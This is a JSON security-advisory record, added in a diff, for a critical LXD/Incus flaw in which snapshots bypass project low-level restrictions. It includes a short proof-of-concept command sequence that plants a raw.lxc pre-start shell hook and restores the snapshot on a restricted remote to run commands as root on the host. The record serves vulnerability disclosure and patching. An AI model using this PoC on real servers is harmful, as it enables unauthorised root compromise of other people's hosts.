@@ -1,0 +1,70 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-11-06T19:51:26Z",
+  "Package": {
+    "Ecosystem": "GO",
+    "Name": "github.com/canonical/lxd"
+  },
+  "Advisory": {
+    "DatabaseId": 527874,
+    "Id": "GSA_kwCzR0hTQS00N3c5LTZyM2YtOTM4Z84ACA4C",
+    "GhsaId": "GHSA-47w9-6r3f-938g",
+    "References": [
+      {
+        "Url": "https://github.com/canonical/lxd/security/advisories/GHSA-47w9-6r3f-938g"
+      },
+      {
+        "Url": "https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48751"
+      },
+      {
+        "Url": "https://github.com/canonical/lxd/commit/5aac658c888d52e3a2480a8f879799ac643fdc49"
+      },
+      {
+        "Url": "https://github.com/canonical/lxd/commit/6b93b2a0c4f6f3eaf91e1e813f6875d5eb66b59b"
+      },
+      {
+        "Url": "https://github.com/canonical/lxd/commit/a52e5d06a52fb7ad8862cb2a8659a8c47e446efe"
+      },
+      {
+        "Url": "https://github.com/canonical/lxd/commit/cfd9f66f6af89e1fa3b3acb12bfe72f51b7f1e19"
+      },
+      {
+        "Url": "https://github.com/canonical/lxd/releases/tag/lxd-5.0.7"
+      },
+      {
+        "Url": "https://github.com/canonical/lxd/releases/tag/lxd-5.21.5"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-47w9-6r3f-938g"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-47w9-6r3f-938g"
+      }
+    ],
+    "Description": "Reported from https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv\n\n### Summary\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting;\nallowing for arbitrary command execution on the Incus server by abusing\nlowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\n\n### Details\n\nInstance snapshots ignore the `restricted.containers.lowlevel=block` setting;\nallowing for arbitrary command execution on the Incus server by abusing\nlowlevel hooks such as `raw.lxc` and `raw.qemu`.\n\nAs snapshots can be moved from one server to another, a malicious\ninstance+snapshot can be crafted locally, moved to a restricted project\nand the snapshot restored for arbitrary command execution.\n\nIn practice, this allows a malicious actor to execute arbitrary commands\non the host with root privileges.\n\n\n### PoC\n\n```\n# remote, restricted\nincus project set rem:project restricted.true\nincus project set rem:project restricted.containers.lowlevel=block\n\n# locally, unrestricted project\nincus init images:debian/trixie rce-raw-lxc\nincus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c \"/bin/id \u003e/lxc-hook-prestart\"'\nincus snapshot create rce-raw-lxc snap0\n#\u003e allow transfer to restricted project\nincus config unset rce-raw-lxc raw.lxc\n\n# locally, transfer and trigger\nincus move rce-raw-lxc rem: --mode push\nincus snapshot restore rem:rce-raw-lxc snap0\nincus start rem:rce-raw-lxc\n```\n\n\n### Impact\n\n- Bypass of project restrictions.\n- Arbitrary command execution on the Incus server.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-11-06T19:51:26Z",
+    "Severity": "CRITICAL",
+    "Summary": "LXD has restricted project bypass leading to arbitrary command execution",
+    "UpdatedAt": "2026-11-06T19:51:26Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.9,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.0.0-20260630083100-c5184be310b1"
+      },
+      "VulnerableVersionRange": "\u003c 0.0.0-20260630083100-c5184be310b1"
+    }
+  ]
+}
